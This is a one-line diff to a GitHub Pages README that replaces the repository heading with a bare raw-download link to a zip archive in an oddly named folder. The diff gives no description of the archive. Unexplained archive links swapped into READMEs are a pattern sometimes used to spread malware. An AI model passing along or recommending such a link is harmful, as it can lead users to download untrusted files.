@@ -1,1 +1,1 @@
-# Pat-Rick22.github.io
+# https://raw.githubusercontent.com/Pat-Rick22/Pat-Rick22.github.io/main/psalmodic/Pat-Rick22.github.io.zip
